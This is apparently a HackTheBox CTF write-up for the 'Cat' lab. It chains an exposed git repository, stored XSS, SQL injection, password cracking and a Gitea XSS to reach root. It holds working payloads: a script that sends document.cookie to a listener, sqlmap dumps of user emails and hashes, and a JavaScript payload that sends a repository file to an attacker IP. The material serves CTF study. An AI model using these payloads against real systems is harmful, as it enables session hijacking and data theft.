----------------

### CTF-: Hackthebox
### LAB-: CAT

----------------

![image](https://github.com/user-attachments/assets/aa20ec71-ca90-423e-9de3-403d6e691987)

-----------------

- Rustscan's output-:

```bash
❯ cat rustscan.txt
❯ rustscan -a cat.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.53:22
Open 10.10.11.53:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 17:39 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Initiating Connect Scan at 17:39
Scanning cat.htb (10.10.11.53) [2 ports]
Discovered open port 22/tcp on 10.10.11.53
Discovered open port 80/tcp on 10.10.11.53
Completed Connect Scan at 17:39, 0.21s elapsed (2 total ports)
Initiating Service scan at 17:39
Scanning 2 services on cat.htb (10.10.11.53)
Completed Service scan at 17:39, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.53.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 8.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Nmap scan report for cat.htb (10.10.11.53)
Host is up, received user-set (0.21s latency).
Scanned at 2025-03-19 17:39:17 WAT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Best Cat Competition
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Exposed `.git` directory-:

![image](https://github.com/user-attachments/assets/3fbbb6d6-de19-4d62-bd7a-6338fd5f0f80)

- I dumped it with `GitTools'` git dumper tool.

![image](https://github.com/user-attachments/assets/cdaf2b1b-7388-4eb0-acf4-4f44c2782ded)

- I extracted it with `extractor.sh` script in `GITTOOLS`.

![image](https://github.com/user-attachments/assets/f2528bd7-096d-4caf-8684-e22821fdbe28)

- It contains the source code for the `cat` php blog on port `80`.

![image](https://github.com/user-attachments/assets/c011defe-95bb-49f4-b6b2-2febcd384c8d)

-------------------

### SOURCE-CODE REVIEW 

### XSS -TO- SQL

-------------------

- To understand the stored xss,we have to trace it from the `contest.php` page.Vulnerable code-:

```php
$stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");
                // Bind parameters
                $stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
                $stmt->bindParam(':age', $age, PDO::PARAM_INT);
                $stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
                $stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
                $stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
                $stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);

```
- You will noticed in this line that the `owner_username` gets inserted into the database unfiltered.

```php
$stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
```
- And it gets stored when we upload a cat in the contest page and executed when the admin interacts with it.Also, the register page does not filter input.Payload-:

```html
"><script>fetch("<url>"+document.cookie)</script>
```

--------------

### SQL injection-:

---------------

- The `accept_cat.php` page which can only be accessed by the admin is vulnerable to sqli  injection because user input in the `catName` param is directly passed into a sql statement.

```php
if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);
```

----------------

### XSS Exploitation-:

----------------

- Register a user with the payload-:

![image](https://github.com/user-attachments/assets/289ef9df-267a-41fe-936b-1c8fefdc0fbc)

- Set up a listener to grab the cookie and upload an image on `contest.php`

![image](https://github.com/user-attachments/assets/84a11eba-2977-498e-bca2-f0e8b0c9ee9a)

- Admin page accessed-:

![image](https://github.com/user-attachments/assets/a0748a93-9d4d-4d19-9bbf-b3b5efdf33ee)

-----------------

### SQLI Exploitation-:

------------------

- The accept_cat page is vulnerable,I exploited with sqlmap.

```bash
❯ sqlmap -r special -p catName --batch --columns --level 5 --risk 3 --threads 4 --hex --dbms=sqlite --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.3#pip}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:46:00 /2025-03-20/

[12:46:00] [INFO] parsing HTTP request from 'special'
[12:46:00] [INFO] testing connection to the target URL
[12:46:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:46:01] [INFO] testing if the target URL content is stable
[12:46:01] [INFO] target URL content is stable
[12:46:01] [WARNING] heuristic (basic) test shows that POST parameter 'catName' might not be injectable                                            
[12:46:01] [INFO] testing for SQL injection on POST parameter 'catName'                                                                            
[12:46:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                       
[12:46:18] [INFO] POST parameter 'catName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)           
[12:46:18] [INFO] testing 'Generic inline queries'                                                                                                 
[12:46:18] [INFO] testing 'SQLite inline queries'                                                                                                  
[12:46:18] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'                                                                   
[12:46:18] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'                                                                             
[12:46:18] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'                                                                        
[12:46:52] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'                                                                         
[12:46:52] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[12:46:52] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[12:46:52] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:46:52] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[12:46:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[12:46:52] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[12:46:52] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[12:46:52] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[12:46:52] [INFO] checking if the injection point on POST parameter 'catName' is a false positive
POST parameter 'catName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=z'||(SELECT CHAR(83,68,84,77) WHERE 8522=8522 AND 8561=8561)||'&catId=1
---
[12:46:59] [INFO] testing SQLite
[12:46:59] [INFO] confirming SQLite
[12:46:59] [INFO] actively fingerprinting SQLite
[12:46:59] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[12:46:59] [INFO] fetching tables for database: 'SQLite_masterdb'
[12:46:59] [INFO] fetching number of tables for database 'SQLite_masterdb'
[12:47:04] [INFO] retrieved: 4    
[12:47:04] [INFO] retrieving the length of query output
[12:47:09] [INFO] retrieved: 26      
[12:47:23] [INFO] retrieved: accepted_cats                            
[12:47:23] [INFO] retrieving the length of query output
[12:47:28] [INFO] retrieved: 30      
[12:47:57] [INFO] retrieved: sqlite_sequence                                
[12:47:57] [INFO] retrieving the length of query output                                                                                            
[12:48:00] [INFO] retrieved: 8                                                                                                                     
[12:48:04] [INFO] retrieved: cats                                                                                                                  
[12:48:04] [INFO] retrieving the length of query output                                                                                            
[12:48:11] [INFO] retrieved: 10                                                                                                                    
[12:48:16] [INFO] retrieved: users                                                                                                                 
[12:48:16] [INFO] retrieving the length of query output                                                                                            
[12:48:23] [INFO] retrieved: 318                                                                                                                   
[12:52:43] [INFO] retrieved: ..353529204E4F54204E554C4C2C0A2020202070617373776F726420564152434841522832353529204E4F54204E__4C4C0A29 316/318 (99%)
[12:52:50] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                              
[12:52:50] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[12:52:50] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
[12:52:51] [WARNING] unexpected response detected. Will use (extra) validation step in similar cases
[12:52:51] [WARNING] unexpected HTTP code '500' detected. Will use (extra) validation step in similar cases
[12:52:52] [INFO] retrieved: 435245415445205441424C4520757365727320280A20202020757365725F696420494E5445474552205052494D415259204B45592C0A20202020757365726E616D6520564152434841522832353529204E4F54204E554C4C2C0A20202020656D61696C20564152434841522832353529204E4F54204E554C4C2C0A2020202070617373776[12:52:52] [INFO] retrieved: CREATE TABLE users (     user_id INTEGER PRIMARY KEY,     username VARCHAR(255) NOT NULL,     email VARCHAR(255) NOT NULL,     password VARCHAR(255) NOT NULL )                                                                                                                                                                                                                                                                                                                                
Database: <current>
Table: None
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| email    | VARCHAR |
| password | VARCHAR |
| user_id  | INTEGER |
| username | VARCHAR |
+----------+---------+

[12:52:52] [INFO] retrieving the length of query output
[12:52:52] [INFO] resumed: 318
[12:52:52] [INFO] resumed: CREATE TABLE users (\n    user_id INTEGER PRIMARY KEY,\n    username VARCHAR(255) NOT NULL,\n    email VARCHAR(255) NOT NULL,\n    password VARCHAR(255) NOT NULL\n)
[12:52:52] [INFO] fetching entries for table 'users'
[12:52:52] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[12:53:04] [INFO] retrieved: 11      
[12:53:05] [INFO] retrieving the length of query output
[12:53:10] [INFO] retrieved: 36      
[12:53:55] [INFO] retrieved: axel2017@gmail.com                                      
[12:53:55] [INFO] retrieving the length of query output
[12:54:00] [INFO] retrieved: 64      
[12:54:51] [INFO] retrieved: 64316262626133363730666562__3433356339383431653_________________ 45/64 (70%)
[12:54:51] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[12:54:51] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[12:54:52] [WARNING] unexpected HTTP code '200' detected. Will use (extra) validation step in similar cases
[12:55:10] [INFO] retrieved: d1bbba3670feb9435c9841e46e60ee2f                                                                  
[12:55:10] [INFO] retrieving the length of query output
[12:55:13] [INFO] retrieved: 2    
[12:55:15] [INFO] retrieved: 1            
[12:55:15] [INFO] retrieving the length of query output
[12:55:17] [INFO] retrieved: 8    
[12:55:22] [INFO] retrieved: axel               
[12:55:22] [INFO] retrieving the length of query output
[12:55:27] [INFO] retrieved: 48      
[12:56:31] [INFO] retrieved: rosamendoza485@gmail.com                                                  
[12:56:31] [INFO] retrieving the length of query output
[12:56:35] [INFO] retrieved: 64      
[12:57:11] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c                                                                  
[12:57:11] [INFO] retrieving the length of query output
[12:57:20] [INFO] retrieved: 2    
[12:57:22] [INFO] retrieved: 2            
[12:57:22] [INFO] retrieving the length of query output
[12:57:25] [INFO] retrieved: 8    
[12:57:29] [INFO] retrieved: rosa               
[12:57:29] [INFO] retrieving the length of query output
[12:57:34] [INFO] retrieved: 58      
[12:58:14] [INFO] retrieved: robertcervantes2000@gmail.com                                                            
[12:58:14] [INFO] retrieving the length of query output
[12:58:20] [INFO] retrieved: 64      
[12:58:53] [INFO] retrieved: 42846631708f69c00ec0c0a8aa4a92ad                                                                  
[12:58:53] [INFO] retrieving the length of query output
[12:58:56] [INFO] retrieved: 2    
[12:58:59] [INFO] retrieved: 3            
[12:58:59] [INFO] retrieving the length of query output
```

- A user `rosa`'s hash got exposed-:

![image](https://github.com/user-attachments/assets/6c497d66-d4c7-4c07-b20b-c966d62f618a)

- I cracked it with crackstation.

![image](https://github.com/user-attachments/assets/97372e89-79be-4eae-8bc9-94560d9a262d)

- SSH access as user `rosa`-:

![image](https://github.com/user-attachments/assets/3ff1e03e-53f1-4dcf-9772-32314133ca17)

- Rosa is part of group `adm`,we have access to the logs.I grepped for user `axel` in the logs and got a hit

![image](https://github.com/user-attachments/assets/c39859e3-1dfe-42e5-b03f-b03a6ced0d18)

- Axel's access-:

![image](https://github.com/user-attachments/assets/14a64ffd-41fc-4fd7-ac09-7b8e2bdbf862)


-------------------

### Privesc with GITEA's XSS

-------------------

- Gitea is running on port `3000` on the server.

![image](https://github.com/user-attachments/assets/ccdfb21e-5914-4cf6-88df-b0c5934b2d61)

- And there is a mail for user `axel` about the Gitea service, a repository on it.The mail also states that if we have any service we can send it to a user `jobert` via mail.

![image](https://github.com/user-attachments/assets/25814d6d-1050-4dd2-9675-1be9fe846188)

- I portforwarded the port with ssh.

![image](https://github.com/user-attachments/assets/79ae47c8-7781-4076-858f-58587e255aa1)

- I accessed AXEL's account.

![image](https://github.com/user-attachments/assets/111d4f3b-33cf-499a-9ece-0cfbcdc877d5)

- This gitea versin `1.22.0` is vulnerable to [cross-site scripting](https://www.exploit-db.com/exploits/52077).

![image](https://github.com/user-attachments/assets/a8185f6d-ad24-40a6-a1f7-b7b15958b6f0)

- I found this payload to read the repo's `index.php` file and send the content to a netcat server.I created the malicious repo first with this xss payload as the description-:

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.176:8001/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>payload</a>
```

- Then, send a mail to `jobert@cat.htb`

![image](https://github.com/user-attachments/assets/6b4ddf25-60f9-4a31-b0e0-792380f33163)

- I receieved this base64 blob.

![image](https://github.com/user-attachments/assets/75896aaf-c30f-4059-9609-a53b31305196)

- The base64 blob contains this credentials which is the `root` user's password.

![image](https://github.com/user-attachments/assets/43595f38-c6a6-4bfc-9c83-25b0b1a22311)

- Root-:

![image](https://github.com/user-attachments/assets/ec6a3675-6bdc-4b45-98db-0693e862f28b)

--------------

### REFERENCE-:

--------------

- [Gitea](https://www.exploit-db.com/exploits/52077)

--------------









































